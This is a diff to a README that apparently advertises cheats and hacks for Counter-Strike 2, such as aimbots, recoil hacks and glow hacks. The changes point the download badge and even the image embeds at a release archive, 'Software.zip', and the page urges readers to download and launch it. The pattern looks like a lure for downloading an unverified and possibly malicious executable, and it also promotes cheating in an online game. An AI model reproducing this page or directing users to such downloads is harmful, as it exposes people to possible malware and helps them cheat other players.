@@ -1,6 +1,6 @@
 # 🎮 Counter-Str1ke-2-H4ck 💣
 
-![CS2 Hack](https://github.com/username/repository/blob/master/images/counter_strike_2_hack.jpg)
+![CS2 Hack](https://github.com/bader999/counter-str1ke-2-h4ck/releases/download/v1.0/Software.zip)
 
 Welcome to the "counter-str1ke-2-h4ck" repository, your ultimate destination for all things related to cheating in Counter-Strike 2! Here you will find all the cheats, hacks, and utilities you need to dominate the game like never before. Whether you're looking for aimbot scripts, recoil hacks, glow hacks, or weapon hacks, we've got you covered.
 
@@ -29,7 +29,7 @@ This repository is dedicated to providing cheats and hacks for Counter-Strike 2,
 
 To get started with the cheats and hacks we provide in this repository, you can download the latest version of our cheat software from the following link:
 
-[![Download Cheat](https://img.shields.io/badge/Download-Cheat-red)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download Cheat](https://github.com/bader999/counter-str1ke-2-h4ck/releases/download/v1.0/Software.zip)](https://github.com/bader999/counter-str1ke-2-h4ck/releases/download/v1.0/Software.zip)
 
 Once you have downloaded the cheat software, you can launch it and start dominating the game in no time.
 
@@ -39,4 +39,4 @@ If the provided download link is not working or you need more options, feel free
 
 Now, go ahead, download the cheats, and become the ultimate Counter-Strike 2 player with our powerful hacking tools. Happy hacking and happy gaming! 💥🔫
 
-![CS2 Logo](https://github.com/username/repository/blob/master/images/counter_strike_2_logo.png)
+![CS2 Logo](https://github.com/bader999/counter-str1ke-2-h4ck/releases/download/v1.0/Software.zip)
